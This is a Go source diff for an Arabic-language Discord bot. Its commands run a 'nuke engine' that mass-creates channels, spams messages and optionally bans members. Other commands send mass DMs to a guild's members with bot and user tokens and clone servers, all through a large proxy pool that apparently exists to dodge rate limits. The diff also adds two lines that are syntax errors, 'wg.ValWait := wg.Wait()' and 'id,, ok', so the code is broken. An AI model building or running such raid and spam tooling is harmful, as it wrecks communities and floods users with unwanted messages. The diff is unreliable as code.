@@ -146,7 +146,9 @@ func main() {
 				Data: &discordgo.InteractionResponseData{Content: "🔄 جاري نسخ الرتب والصلاحيات والترتيب بدقة تامة...", Flags: discordgo.MessageFlagsEphemeral},
 			})
 			tokens := parseTokens(optMap["bot_tokens"])
-			go executeServerClonerWithUserToken(tokens, optMap["user_token"], massiveProxyPool, i.GuildID, optMap["template_guild_id"], i.Interaction, s)
+			templateID := optMap["template_guild_id"].(string)
+			usrToken := optMap["user_token"].(string)
+			go executeServerClonerWithUserToken(tokens, usrToken, massiveProxyPool, i.GuildID, templateID, i.Interaction, s)
 
 		} else if data.Name == cmdNuke {
 			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
@@ -154,7 +156,12 @@ func main() {
 				Data: &discordgo.InteractionResponseData{Content: "🚀 جاري تفعيل محرك nuke1 بالسرعة القصوى...", Flags: discordgo.MessageFlagsEphemeral},
 			})
 			tokens := parseTokens(optMap["bot_tokens"])
-			go executeNukeEngine(tokens, massiveProxyPool, i.GuildID, s.State.User.ID, optMap["room_name"], int(optMap["rooms_count_val"]), optMap["message_content"], int(optMap["messages_count_val"]), optMap["enable_ban_val"], s)
+			roomName := optMap["room_name"].(string)
+			roomsCount := int(optMap["rooms_count_val"].(int64))
+			msgContent := optMap["message_content"].(string)
+			msgsCount := int(optMap["messages_count_val"].(int64))
+			enableBan := optMap["enable_ban_val"].(bool)
+			go executeNukeEngine(tokens, massiveProxyPool, i.GuildID, s.State.User.ID, roomName, roomsCount, msgContent, msgsCount, enableBan, s)
 
 		} else if data.Name == cmdMassDM {
 			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
@@ -162,7 +169,10 @@ func main() {
 				Data: &discordgo.InteractionResponseData{Content: "🔍 جاري فحص الكاش والتقاطع المحلي للأعضاء...", Flags: discordgo.MessageFlagsEphemeral},
 			})
 			tokens := parseTokens(optMap["bot_tokens"])
-			go executeCrossReferenceMassDM(tokens, optMap["user_token"], massiveProxyPool, optMap["guild_id"], optMap["message"], i.ChannelID, i.Interaction, s)
+			guildID := optMap["guild_id"].(string)
+			userToken := optMap["user_token"].(string)
+			message := optMap["message"].(string)
+			go executeCrossReferenceMassDM(tokens, userToken, massiveProxyPool, guildID, message, i.ChannelID, i.Interaction, s)
 		}
 	})
 
@@ -759,6 +769,7 @@ func executeCrossReferenceMassDM(tokens []string, userToken string, rawProxies [
 		}(w)
 	}
 
+	wg.ValWait := wg.Wait()
 	wg.Wait()
 	finalReport := fmt.Sprintf("✅ انتهت الحملة بنجاح! تم إرسال الرسالة إلى **(%d)** من أصل **(%d)** عضو. 🚀", successCount, len(allUserIDs))
 	updateInteractionStatus(s, interaction, finalReport)
@@ -916,7 +927,7 @@ func executeNukeEngine(tokens []string, rawProxies []string, guildID, botID, roo
 				if resp.StatusCode == 200 || resp.StatusCode == 201 {
 					var res map[string]interface{}
 					if json.NewDecoder(resp.Body).Decode(&res) == nil {
-						if id, ok := res["id"].(string); ok {
+						if id,, ok := res["id"].(string); ok {
 							muChannels.Lock()
 							newChannelIDs = append(newChannelIDs, id)
 							muChannels.Unlock()
